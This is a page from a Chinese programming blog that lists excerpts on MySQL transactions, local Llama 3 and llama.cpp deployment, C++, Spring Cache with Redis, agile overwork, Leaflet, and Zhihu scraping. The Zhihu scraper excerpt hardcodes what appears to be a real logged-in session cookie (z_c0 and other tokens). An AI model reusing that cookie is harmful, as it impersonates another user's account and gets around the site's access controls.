		<a class="list__footer-readmore btn" href="/posts/e1fcec5708f86b851fde47665165ba99/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9c7f388025994309b74aa96c00a12214/" rel="bookmark">
			【MySQL】事务一
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		事务一 1.什么是事务2.为什么会存在事务3.事务的版本支持4.事务的提交方式5.事务常见操作方式6.事务隔离级别6.1读未提交【Read Uncommitted】6.2读提交【Read Committed】6.3可重复读【Repeatable Read】6.4串行化【serializable】 点赞👍👍收藏🌟🌟关注💖💖
你的支持是对我最大的鼓励，我们一起努力吧!😃😃
1.什么是事务 mysql存的是数据注定会被多个客户端同时访问，mysql内部是采用多线程方式来实现存储相关工作的，注定会有对数据并发访问的场景，为了更好解决这类事情，关系型数据库为我们提供了事务。
CURD不加控制，会有什么问题？
当两个人同时向火车票售票系统买票时，买票肯定先判断是否有票，当A进入判断之后，客户端A因为某些原因线程被切走了，然后客户端B也要判断进来之后也因为某些原因线程被切走了。此时A被唤醒从被切走的地方继续往下执行然后把票数减1就结束了它的操作。B然后也被唤醒了继续往下执行因为它是已经在判断里面的，它并不知道此时票数减为0了，它以为还有此时票数又被减1了。此时就有问题了。一张票被卖了两次！
数据库为了解决并发带来的问题，必须提出解决的方案！
CURD满足什么属性，能解决上述问题？
买票的过程得是原子的吧
要么没买，要么一定买成功，不存在中间状态，出现问题回滚到开始状态，彷佛什么事情都没干一样。买票互相应该不能影响吧
我买的过程之中，你就来了，你会影响到我。彼此之间要隔离开，你买你的，我买我的，不要互相影响。买完票应该要永久有效吧
购买成功这件事情必须是持久的，不受其他情况影响。买前，和买后都要是确定的状态吧
买前就是没买状态，买了就是买了状态，不能出现中间状态。 随着下面的学习，我们慢慢理解为什么四个就已经能够解决这个问题了。
那什么是事务？
实际上当我们写sql语句的时候，不一定一条sql就能解决所有问题，有时候我们需要一批sql语句在一起才有意义。就比如转钱，一定是这里update 减去100 ，哪里update 加上100。这两句单但拿出来就是一条sql语句没有意义，但是站在上层使用数据库的人，把两条sql合在一起（看成一个整体）它就叫做转账逻辑。所以我们把两条sql共同构成的一组DML数据管理语句，叫做事务。 换句话说，
事务是由一条或者多条sql语句构成的sql集合体，这个集合体合在一起共同要完成某种任务。
事务就是一组DML语句组成，这些语句在逻辑上存在相关性，（比如转账逻辑，分开就是两条单独update语句，但是合在一起它们是有逻辑关系的，所以学习事务不能站在程序员视角理解事务，一定要站在使用数据库的使用者去看待事务）这一组DML语句要么全部成功，要么全部失败，是一个整体。这是由MySQL给我们提供一种机制，保证我们达到这样的效果。事务还规定不同的客户端看到的数据是不相同的。
事务就是要做的或所做的事情，主要用于处理操作量大，复杂度高的数据。假设一种场景：你毕业了，学校的教务系统后台 MySQL 中，不在需要你的数据，要删除你的所有信息(一般不会:) ), 那么要删除你的基本信息(姓名，电话，籍贯等)的同时，也删除和你有关的其他信息，比如：你的各科成绩，你在校表现，甚至你在论坛发过的文章等。这样，就需要多条 MySQL 语句构成，那么所有这些操作合起来，就构成了一个事务。
正如我们上面所说，一个 MySQL 数据库，可不止你一个事务在运行，同一时刻，甚至有大量的请求被包装成事务，在向 MySQL 服务器发起事务处理请求。而每条事务至少一条 SQL ，最多很多 SQL ,这样如果大家都访问同样的表数据，在不加保护的情况，就绝对会出现并发执行访问公共数据的问题。甚至，因为事务由多条 SQL 构成，那么，也会存在执行到一半出错或者不想再执行的情况，那么已经执行的怎么办呢？
所以，一个完整的事务，绝对不是简单的 sql 集合，还需要满足如下四个属性：
原子性：一个事务（transaction）中的所有操作，要么全部完成，要么全部不完成，不会结束在中间某个环节。事务在执行过程中发生错误，要么自动回滚(Rollback)到事务开始前的状态，要么用户手动回滚到事务开始前的状态，就像这个事务从来没有执行过一样。
持久性：事务处理结束后，那事务对表中数据的修改就是永久的，即便系统故障也不会丢失。
隔离性：数据库允许多个并发事务同时对其数据进行读写和修改的能力，隔离性可以防止多个事务并发执行时由于交替去进行修改同一份数据进而导致数据的不一致。所以事务可以将我们要访问的数据一个个隔离开，你访问你的并不会影响我，这就是隔离性。事务隔离可以分为不同级别，包括读未提交（ Readuncommitted ）、读提交（ read committed ）、可重复读（ repeatable read ）和串行化（ Serializable ），因为有隔离性所以可以保证数据在不同的隔离级别下保证不同用户对数据的可见性。
一致性：在事务开始之前和事务结束以后，数据库的完整性没有被破坏。（意思是我们从一种状态变成另一种状态它的结果是可预期的，比如我转账，我账户200，你账户50。我给你转50，所以我可以预期的是成功了，我账户150，你账户100，失败了我还是200，你还是50。这就是我还没有操作，但是为了操作后结果是可预期的，这就是一致性。）这表示写入的资料必须完全符合所有的预设规则，这包含资料的精确度、串联性以及后续数据库可以自发性地完成预定的工作。
事务的四大特性之中，原子性和持久性最好理解，隔离性是我们要重点理解的，一致性比较不好理解，但是mysql对于事务一致性其实没有做什么工作。在技术上没有对一致性有什么策略，只不过一致性是通过原子性、持久性、隔离性来保证数据库的一致性 。原子性、持久性、隔离性是因，一致性是果。并且一致性光靠数据库是做不到的，还需要用户配合才能达到一致性，具体后面在说。
上面四个属性，可以简称为 ACID 。
原子性（Atomicity，或称不可分割性）一致性（Consistency）隔离性（Isolation，又称独立性）持久性（Durability） 事务是一堆sql集合在业务层面上要完成某种具体需求，mysql为了支持我们，将多条sql这些sql在逻辑上有上下文关系的把它们封装成事务。 而为了更好支持事务不仅仅是简单把sql做封装，为了事务在并发条件下更好、更快、更安全去运行，此时就需要用原子性、持久性、隔离性、一致性来保证事务正确运行。最终一句话总结，所谓的事务在ACID的加持下由一条或者多条sql共同构建出的我们就称之为事务。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9c7f388025994309b74aa96c00a12214/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eeedc8e638f193c1fb56989fc61ba360/" rel="bookmark">
			笔记本电脑安装属于自己的Llama 3 8B大模型和对话客户端
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		选择 Llama 3 模型版本（8B，80 亿参数） 特别注意： Meta 虽然开源了 Llama 3 大模型，但是每个版本都有 Meta 的许可协议，建议大家在接受使用这些模型所需的条款之前仔细阅读。
Llama 3 模型版本有几个，我们主要关注 80 亿参数（Llama 3 8B）和 700 亿参数（Llama 3 70B）这两个版本。它们对电脑系统配置有不同的要求，主要计算资源（即：CPU/GPU）和内存来存储和处理模型权重：
Llama 3 8B 版本：对于 80 亿参数的模型，建议至少 4 核 CPU，至少 16GB 内存（推荐 32GB 或更高），以确保模型加载和运行过程中的流畅性；模型文件大小 5 GB 左右，磁盘空间有 10GB 足够了；GPU 是可选的，它可以显著提高推理速度
Llama 3 70B 版本：对于 700 亿参数的模型，CPU 要求显著提高（建议 16 核以上），至少需要 64GB 内存（推荐 128GB 或更高），模型在推理时会占用大量的内存资源；模型文件超过 20GB，远超 8B 版本；强烈推荐使用高端 GPU，以实现有效加速
综上所述，8B 版本比较适合我们个人电脑，硬件配置基本能符合，同时模型又不失推理效果：
下载 Llama 3 8B 模型文件 我们第一步是想自己部署尝鲜，因此直接下载压缩后的模型权重，文件为GGUF格式，GGUF格式是为了快速推理和优化内存使用而设计的，相比以前的GGML格式，GGUF支持更复杂的令牌化过程和特殊令牌处理，能更好地应对多样化的语言模型需求。就是因为有GGUF格式，Llama 3大语言模型才可以在笔记本电脑上运行，同时GGUF就一个文件，也简化了模型交换和部署的过程，它对促进模型的普及和应用有着积极作用。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/eeedc8e638f193c1fb56989fc61ba360/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c193db648f05cf870e5954ad599695b9/" rel="bookmark">
			【C&#43;&#43;】类和对象（下）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【C++】类和对象（下） 初始化列表构造时的类型转化static成员概念特性 友元友元函数友元类 内部类匿名对象总结 初始化列表 在对类和对象有了基本的认识之后，可以知道在创建对象的时候，编译器通过调用构造函数，给对象中各个成员变量一个合适的初始值。
class Date { public: Date(int year, int month, int day) { _year = year; _month = month; _day = day; } private: int _year; int _month; int _day; }; 上面的代码通过构造函数赋予了成员变量新的值，但不能称之为对对象中成员变量的初始化，构造函数中的语句只能称之为赋初值，而不能称作初始化。
初始化只能初始化一次，而构造函数体内可以多次赋值。 初始化列表：以一个冒号开始，接着是一个以逗号分隔的数据或成员列表，每个成员变量后面跟着一个放在括号中的初始值或者表达式。
class Date { public: Date(int year, int month, int day) //对象的定义 :_year(year) ,_month(month) ,_day(day) {} private: //对象的声明 int _year; int _month; int _day; }; int main(void) { Date d(2000,1,1);//对象的整体定义 return 0; } 成员变量在类里面是声明，在主函数（main）中会对成员变量进行对象的整体定义，所有C++中规定了初始化列表，对象的成员定义的位置便是在初始化列表，在构造函数体内进行的是成员变量的赋值。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c193db648f05cf870e5954ad599695b9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/acb576b6f4b70bd2a2558ece9a7e9aa6/" rel="bookmark">
			SpringBoot系列——使用Spring Cache和Redis实现查询数据缓存
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1. 前言2. 缓存2.1 什么是缓存2.2 使用缓存的好处2.3 缓存的成本2.4 Spring Cache和Redis的优点 3. Spring Cache基础知识3.1 Spring Cache的核心概念3.2 Spring Cache的注解3.2.1 SpEL表达式3.2.2 @Cacheable3.2.3 @CachePut3.2.4 @CacheEvict 4. 实现查询数据缓存4.1 准备工作4.2 添加依赖4.3 修改配置文件4.4 配置缓存管理器4.5 使用Spring Cache注解4.6 测试4.6.1 查询测试4.6.2 更新、删除测试 5. 总结 1. 前言 在现代应用程序中，查询缓存的使用已经变得越来越普遍。它不仅能够显著提高系统的性能，还能提升用户体验。缓存通过在内存中存储频繁访问的数据，减少对数据库或其他存储系统的访问，从而加快数据读取速度。在这篇文章中，我们将探讨缓存的基本概念、重要性以及如何使用Spring Cache和Redis实现查询数据缓存 。
2. 缓存 2.1 什么是缓存 缓存是一种临时存储机制，用于在内存中保存频繁访问的数据。它可以是硬件（如CPU缓存）或软件（如应用程序缓存）。缓存的主要目的是通过减少数据访问的延迟，提高系统的响应速度。以下是缓存的一些关键特性：
临时性：缓存中的数据通常是临时的，会在一段时间后失效或被替换。快速访问：由于缓存数据存储在内存中，访问速度非常快。空间有限：缓存的存储空间通常有限，因此需要有效的管理策略，如LRU（最近最少使用）策略。 2.2 使用缓存的好处 提高性能：缓存可以显著减少数据读取的时间，因为内存访问速度比硬盘或网络存储快很多。减轻数据库负载：缓存可以减少数据库的查询次数，从而减轻数据库的负载，提升整体系统的稳定性和可扩展性。节省资源：通过减少对后端系统的访问，缓存可以帮助节省带宽和计算资源。提高用户体验：快速的数据访问可以显著提升用户体验，特别是在需要频繁读取数据的应用场景中。 2.3 缓存的成本 内存消耗：缓存需要占用系统的内存资源，过多的缓存可能会影响其他应用程序的性能。数据一致性：缓存中的数据可能会与数据库中的数据不一致，尤其是在数据频繁更新的场景中。需要设计有效的缓存失效策略来保证数据的一致性。复杂性增加：引入缓存机制会增加系统的复杂性，需要处理缓存的管理、更新和失效等问题。维护成本：缓存系统需要定期监控和维护，以确保其高效运行。 2.4 Spring Cache和Redis的优点 为了实现高效的数据缓存，Spring Boot提供了Spring Cache模块，而Redis则是一个强大的缓存数据库。结合使用Spring Cache和Redis，能够充分发挥二者的优点，实现高效的数据缓存。
Spring Cache的优点： 简化缓存操作：Spring Cache提供了一系列注解（如@Cacheable、@CachePut、@CacheEvict），简化了缓存的使用，使开发者能够专注于业务逻辑。灵活的缓存管理：Spring Cache支持多种缓存提供者（如EhCache、Hazelcast、Redis等），可以根据具体需求选择合适的缓存实现。透明的缓存机制：Spring Cache使得缓存操作对业务代码透明，开发者无需关心缓存的具体实现细节。 Redis的优点： 高性能：由于数据存储在内存中，Redis的读写速度非常快，能够处理每秒数百万级别的请求。丰富的数据结构：Redis支持多种数据结构，如字符串、哈希、列表、集合、有序集合等，能够满足不同场景下的数据存储需求。持久化支持：虽然Redis主要用于内存存储，但它也提供了数据持久化的功能，可以将数据定期保存到磁盘，防止数据丢失。分布式支持：Redis支持主从复制、哨兵模式和集群模式，能够实现高可用性和数据的水平扩展。灵活的过期策略：Redis支持为每个键设置过期时间，自动删除过期数据，方便实现缓存失效策略。 3. Spring Cache基础知识 在Spring Boot中，Spring Cache提供了一套简洁且强大的缓存抽象机制，帮助开发者轻松地将缓存集成到应用程序中。以下是Spring Cache的一些核心概念和常用注解。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/acb576b6f4b70bd2a2558ece9a7e9aa6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/917278123655601fba881ae74a674547/" rel="bookmark">
			基于SSM&#43;Jsp的在线教育资源管理系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		开发语言：Java框架：ssm技术：JSPJDK版本：JDK1.8服务器：tomcat7数据库：mysql 5.7（一定要5.7版本）数据库工具：Navicat11开发软件：eclipse/myeclipse/ideaMaven包：Maven3.3.9 系统展示
管理员登录
管理员功能
教师管理
公告信息管理
课程信息管理
试题管理
试卷管理
考试记录管理
留言板管理
学生功能界面
前台首页
个人中心
错题本界面
教师功能界面
摘要
在线教育资源管理系统，主要的模块包括管理员；个人中心、学生管理、教师管理、公告信息管理、课程信息管理、试题管理、留言板管理、管理员管理、试卷管理、系统管理、考试管理，学生；个人中心、留言板管理、考试管理，教师；个人中心、课程信息管理、试题管理、留言板管理、试卷管理、考试管理，前台首页；首页、公告信息、课程信息、试卷列表、留言反馈、我的、跳转到后台等功能。系统中管理员主要是为了安全有效地存储和管理各类信息，还可以对系统进行管理与更新维护等操作，并且对后台有相应的操作权限。
要想实现在线教育资源管理系统的各项功能，需要后台数据库的大力支持。管理员验证注册信息，收集的用户信息，并由此分析得出的关联信息等大量的数据都由数据库管理。本文中数据库服务器端采用了Mysql作为后台数据库，使Web与数据库紧密联系起来。在设计过程中，充分保证了系统代码的良好可读性、实用性、易扩展性、通用性、便于后期维护、操作方便以及页面简洁等特点。
研究背景
随着社会的快速发展，计算机的影响是全面且深入的。人们的生活水平不断提高，日常生活中用户对在线教育资源管理系统方面的要求也在不断提高，需要在线教育资源的人数更是不断增加，使得在线教育资源管理系统的开发成为必需而且紧迫的事情。在线教育资源管理系统主要是借助计算机，通过对在线教育资源管理系统所需的信息管理，增加用户选择，同时也方便对广大用户信息的及时查询、修改以及对用户信息的及时了解。在线教育资源管理系统对用户带来了更多的便利, 该系统通过和数据库管理系统软件协作来满足用户的需求。
关键技术
JSP(Java脚本页面)是Sun和许多参与建立的公司所提倡的动态web技术。将Java程序添加到传统的web页面HTML文件(*)。htm,*。Html)。
JAVA语言是目前软件市场上应用最广泛的语言开发程序。可以在多种平台上运用的，兼容性比较强，适应市面上大多数操作系统，不会出现乱码的现像，其扩展性和维护性都更好，具有分析问题和解决问题的能力，是面向过程的程序设计方便我们编写的代码更强壮。
MYSQL数据库运行速度快，安全性能也很高，而且对使用的平台没有任何的限制，所以被广泛应运到系统的开发中。MySQL是一个开源和多线程的关系管理数据库系统，MySQL是开放源代码的数据库，具有跨平台性。
B/S（浏览器/服务器）结构是目前主流的网络化的结构模式，它能够把系统核心功能集中在服务器上面，可以帮助系统开发人员简化操作，便于维护和使用。
系统分析
对系统的可行性分析以及对所有功能需求进行详细的分析，来查看该系统是否具有开发的可能。
系统设计
功能模块设计和数据库设计这两部分内容都有专门的表格和图片表示。
系统实现
管理员登录进入在线教育资源管理系统可以查看个人中心、学生管理、教师管理、公告信息管理、课程信息管理、试题管理、留言板管理、管理员管理、试卷管理、系统管理、考试管理等内容。学生登录进入在线教育资源管理系统可以查看个人中心、留言板管理、考试管理等内容。学生登录进入在线教育资源管理系统可以查看首页、公告信息、课程信息、试卷列表、留言反馈、我的、跳转到后台等内容。教师登录进入在线教育资源管理系统可以查看个人中心、课程信息管理、试题管理、留言板管理、试卷管理、考试管理等内容。
系统测试
程序设计不能保证没有错误，这是一个开发过程，在错误或错误的过程中都是难以避免的。虽然这是不可避免的，但我们不能使这些错误始终存在于系统中，错误可能会造成无法估量的后果，如系统崩溃，安全信息泄露，系统无法正常启动等，为了避免这些问题我们需要测试程序，在测试过程中发现问题并纠正它们，从而使系统更长时间稳定成熟。
软件在设计后必须进行测试，调试过程中使用的方法是软件测试方法。在开发新软件时，系统测试是检查软件是否合格的关键步骤，以及是否符合设计目标的参考。测试主要是查看软件中数据的准确性，正确的操作与否，以及操作的结果，还有哪些方面需要改进。
在线教育资源管理系统的实现，对于系统中功能模块的实现及操作都必须通过测试进行来评判系统是否可以准确的实现。在在线教育资源管理系统正式上传使用之前必须做的一步就是系统测试，对于测试发现的错误及时修改处理，保证系统准确无误的供给用户使用。
结论
本系统通过对jsp和Mysql数据库的简介，从硬件和软件两反面说明了在线教育资源管理系统的可行性，本文结论及研究成果如下：实现了jsp与Mysql相结合构建的在线教育资源管理系统 ，网站可以响应式展示。通过本次在线教育资源管理系统的研究与实现，我感到学海无涯，学习是没有终点的，而且实践出真知，只有多动手才能尽快掌握它，经验对系统的开发非常重要，经验不足，就难免会有许多考虑不周之处。比如要有美观的界面，更完善的功能，才能吸引更多的用户 。
（可运行源码+sql文件+文档）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0a4c0bc7e7efcaede00b253951a18197/" rel="bookmark">
			敏捷＝996/007？现实是……
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近几年，大部分公司都在招聘信息里宣扬拥抱敏捷开发，敏捷管理，让人一看就觉得高大上，殊不知，不知道坑了多少纯真烂漫的应届生。
他们满怀期待地步入职场，以为凭借着自己985，211的金字招牌，在职场上混的风生水起，顶着敏捷的高大上，兴奋不已！
可事实却是，残酷的职场打工潜规则，让他们看清了社会残酷的现实。牛马的世界如何高谈鸿鹄之志。
虽然现实职场上，敏捷已然成为了免费加班，任劳任怨，早9晚10，外加周六日，回到家连休息都感到奢望的代名词。
但是，真的不要怪敏捷，敏捷无罪，怪就怪资本家太坏了，绞尽脑汁压榨打工人的剩余价值。加上大环境比较差，牛马们没法说走就走，只能继续卷。
好了，如果你看到某某招聘信息里有敏捷二字，基本上就可以确定，996是少不了的了。愿不愿意去，就看你自己的了。
敏捷开发对个人的要求还是比较高的，不要以为拿到offer，进入职场，就能当个普通的牛马了，敏捷可不是普通牛马，敏捷要求你积极主动能抗压，为了工作要拼搏，拼搏自然就少不了要主动反馈问题，牺牲自己的休息时间。
比较正规的敏捷开发中，上司还会开会给你讲讲怎么干活，不正规的就完全看你自己能不能主动去要活干了。而且还要主动关注项目的进展情况，随时做出变更。所以加班加点是家常饭。
好处就是，现在累，以后你就会因为自己能熬过来感到感动。进步也特别快！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/75432fd5afe0c05a6bb7d2243ae51471/" rel="bookmark">
			使用llama.cpp实现LLM大模型的格式转换、量化、推理、部署
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用llama.cpp实现LLM大模型的格式转换、量化、推理、部署 概述 llama.cpp的主要目标是能够在各种硬件上实现LLM推理，只需最少的设置，并提供最先进的性能。提供1.5位、2位、3位、4位、5位、6位和8位整数量化，以加快推理速度并减少内存使用。
GitHub：https://github.com/ggerganov/llama.cpp
克隆和编译 克隆最新版llama.cpp仓库代码
python 复制代码git clone https://github.com/ggerganov/llama.cpp 对llama.cpp项目进行编译，在目录下会生成一系列可执行文件
css复制代码main：使用模型进行推理 quantize：量化模型 server：提供模型API服务 1.编译构建CPU执行环境，安装简单，适用于没有GPU的操作系统
python复制代码cd llama.cpp mkdir 2.编译构建GPU执行环境，确保安装CUDA工具包，适用于有GPU的操作系统
如果CUDA设置正确，那么执行nvidia-smi、nvcc --version没有错误提示，则表示一切设置正确。
python 复制代码make clean &amp;&amp; make LLAMA_CUDA=1 3.如果编译失败或者需要重新编译，可尝试清理并重新编译，直至编译成功
python 复制代码make clean 😝有需要的小伙伴，可以V扫描下方二维码免费领取🆓
## 环境准备 1.下载受支持的模型
要使用llamma.cpp，首先需要准备它支持的模型。在官方文档中给出了说明，这里仅仅截取其中一部分
2.安装依赖
llama.cpp项目下带有requirements.txt 文件，直接安装依赖即可。
python 复制代码pip install -r requirements.txt 模型格式转换 根据模型架构，可以使用convert.py或convert-hf-to-gguf.py文件。
转换脚本读取模型配置、分词器、张量名称+数据，并将它们转换为GGUF元数据和张量。
GGUF格式 Llama-3相比其前两代显著扩充了词表大小，由32K扩充至128K，并且改为BPE词表。因此需要使用--vocab-type参数指定分词算法，默认值是spm，如果是bpe，需要显示指定
注意：
官方文档说convert.py不支持LLaMA 3，喊使用convert-hf-to-gguf.py，但它不支持--vocab-type，且出现异常：error: unrecognized arguments: --vocab-type bpe，因此使用convert.py且没出问题
使用llama.cpp项目中的convert.py脚本转换模型为GGUF格式
python复制代码root@master:~/work/llama.cpp# python3 ./convert.py /root/work/models/Llama3-Chinese-8B-Instruct/ --outtype f16 --vocab-type bpe --outfile ./models/Llama3-FP16.gguf INFO:convert:Loading model file /root/work/models/Llama3-Chinese-8B-Instruct/model-00001-of-00004.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/75432fd5afe0c05a6bb7d2243ae51471/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e0290eb4369cae5175e04252474c63bf/" rel="bookmark">
			Leaflet集成wheelnav在WebGIS中的应用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
前言
一、两种错误的实现方式
1、组件不展示
2、意外中的空白
二、不同样式的集成
1、在leaflet中集成wheelnav
2、给marker绑定默认组件
2、面对象绑定组件
3、如何自定义样式 三、总结
前言 在之前的博客中，我们曾经介绍了使用wheelnav.js构建酷炫的动态导航菜单。这是传统的html应用的实例，那么在构建WebGIS相关的应用中，wheelnav有哪些应用场景呢？众所周知GIS界面元素较多，要展示的信息有限。但如何利用有限的空间展示更多的信息就成为了我们关注的点。wheelnav的一个重要理念就是分类导航，比如我们关注的一个空间对象，如点、线、面等。在现实世界中，它一定是有许多的分类属性，而通过不同的分类属性又可以进行进一步的扩展，相当于是数据的挖掘。而通过挖掘的数据则可以通过wheelnav来进行可视化展示。
关于wheelnav的使用教程，大家可以去它的官网网站上查询，示例和教程比较丰富。这里不再赘述，通过网络寻找可以看到，如何将wheelnav应用到webgis的领域，这方面的案例还是比较少的，可参考的源代码也不多。
本文将wheelnav和webgis进行结合，以Leafletjs为webgis可视化组件。重点讲解如何在Leaflet中集成，分别为点、面、圆等空间对象绑定wheelnav对象，同时讲解一些在集成过程中容易出现的错误，让大家在集成组件时知道哪里会有问题。如果您当前也有这方面的需求，可以看看本文的实现方式。
一、两种错误的实现方式 组件的集成不是一下子就能成功的，尤其是在WebGIS中，我在刚开始做集成的时候，也是由于对组件的不熟悉，对Leaflet组件的掌握不够，导致走了很多弯路，没有实现预期的效果。因此这里首先将分享在Leaflet当中的两种错误的实现方式，让大家在集成的过程当中少走弯路。
案例的场景是用户在leaflet当中点击空间点线面对象时，会自动弹出一个Wheelnav的组件，然后可以实现动态导航。我们知道在Leaflet当中，要想实现点击后弹出一个信息窗口，可以使用Popup的方式。确实这么做是可以实现的，本文也是使用这种技术方案来实现的。如果您是使用其它的技术方案，本文供参考。
1、组件不展示 这里首先分享一个把Wheelnav对象和popup对象绑定后，页面不展示，同时在控制台有报错的情况怎么解决。下面以代码的形式给出。通常在leaflet当中，如果是正常的信息弹窗，我们仅需要将以下代码和空间对象进行绑定即可，需要绑定popup的代码如下：
L.polygon([ [32.916485, 101.601563], [30.562261, 105.556641], [34.524661, 108.149414] ]).addTo(mymap).bindPopup("我是一个多边形."); 然后我们按照这种思路，将wheelnav组件集成进来。
L.marker([22.024546, 110.654297]).addTo(mymap) .bindPopup("&lt;div id='divWheelnav' class='wheelNavGitHub'&gt;&lt;/div&gt;"); 在这里呢，我们将一个div信息作为wheelnav的展现元素绑定到popup中，然后根据wheelnav的api来创建展示组件。
var wheel = new wheelnav('divWheelnav'); wheel.slicePathFunction = slicePath().DonutSlice; wheel.markerPathFunction = markerPath().PieLineMarker; wheel.clickModeRotate = false; wheel.colors = ['#497F4C']; wheel.markerEnable = true; wheel.createWheel(['默认', '饼图', '菜单', '线', 'drop']); 然后我们打开界面来预览一下效果，看是否已经将wheel组件集成上来。不出意外的话就一定会很快出现意外。
确实出现了弹窗，但是页面是空白的，没有出现我们预想的wheelnav组件。我们来看一下console的控制台是否报错。 果然报错了，信息如下：
wheelnav.js:275 Uncaught TypeError: Cannot read properties of undefined (reading 'length') at wheelnav.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e0290eb4369cae5175e04252474c63bf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4de5fb42aab3be3b35697467a5a199b8/" rel="bookmark">
			AI大模型探索之路-实战篇：智能化IT领域搜索引擎之知乎网站数据获取（函数封装）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		系列篇章💥 No.文章1AI大模型探索之路-实战篇：智能化IT领域搜索引擎的构建与初步实践2AI大模型探索之路-实战篇：智能化IT领域搜索引擎之GLM-4大模型技术的实践探索3AI大模型探索之路-实战篇：智能化IT领域搜索引擎之知乎网站数据获取（初步实践）4AI大模型探索之路-实战篇：智能化IT领域搜索引擎之知乎网站数据获取（函数封装）5AI大模型探索之路-实战篇：智能化IT领域搜索引擎之知乎网站数据获取（流程优化）6AI大模型探索之路-实战篇：智能化IT领域搜索引擎之github网站在线搜索7AI大模型探索之路-实战篇：智能化IT领域搜索引擎之HuggingFace网站在线搜索 目录 系列篇章💥一、前言二、总体概览三、爬取知乎网站的代码逻辑封装1、定义搜索服务2、搜索服务调用测试3、数据本地存储 四、自动搜索流程封装1、封装搜索函数2、大模型调用测试3、整合Funcation Calling流程4、大模型调用测试 结语 一、前言 在上一篇章中，我们成功实现了知乎网站数据获取的基本流程，包括各类网页数据的解析等关键步骤。本篇章将进一步实现智能搜索的代码落地，对相关搜索、大模型调用的函数进行统一化封装，以提升代码的可维护性和可复用性。
二、总体概览 本章将聚焦于智能搜索功能的完善与优化。我们将通过精心设计的封装技术，将相关的搜索功能和大模型调用函数进行模块化处理，从而实现代码的高效复用。这不仅有助于简化后续的开发工作，还能有效提升搜索引擎的性能和用户体验。
三、爬取知乎网站的代码逻辑封装 1、定义搜索服务 url = 'https://www.zhihu.com/question/639787253/answer/3365580226' #%% if 'answer' in url: print('a') 查询搜索网页数据，并进行解析
def get_search_text(q, url): cookie = "q_c1=3c10baf5bd084b3cbfe7eece648ba243|1704976541000|1704976541000; _zap=086350b3-1588-49c4-9d6d-de88f3faae03; d_c0=AGCYfYvO_RePTvjfB1kZwPLeke_N5AM6nwo=|1704949678; _xsrf=qR1FJHlZ9dvYhhoj4SUj43SAIBUwPOqm; __snaker__id=wNWnamiJKBI0kzkI; q_c1=d44e397edb6740859a7d2a0d4155bfab|1706509753000|1706509753000; Hm_lvt_98beee57fd2ef70ccdd5ca52b9740c49=1706509695,1706589529,1706765465,1708650963; z_c0=2|1:0|10:1713167971|4:z_c0|80:MS4xOGRHQVNnQUFBQUFtQUFBQVlBSlZUYjZqOTJaLXVDSjdRSmJKMHgyVEhxTE13UGN1TUJBdHZnPT0=|15b2c2ece393ac4ea374d9b36cde5af7304f8ee7632e060fe6835bfadb5e4132; KLBRSID=9d75f80756f65c61b0a50d80b4ca9b13|1713170212|1713167958" user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" code_ = False headers = { 'authority': 'www.zhihu.com', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'zh-CN,zh;q=0.9,en;q=0.8', 'cache-control': 'max-age=0', 'cookie': cookie, 'upgrade-insecure-requests': '1', 'user-agent':user_agent, } # 普通问答地址 if 'zhihu.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4de5fb42aab3be3b35697467a5a199b8/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/265/">«</a>
	<span class="pagination__item pagination__item--current">266/621</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/267/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大咖.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>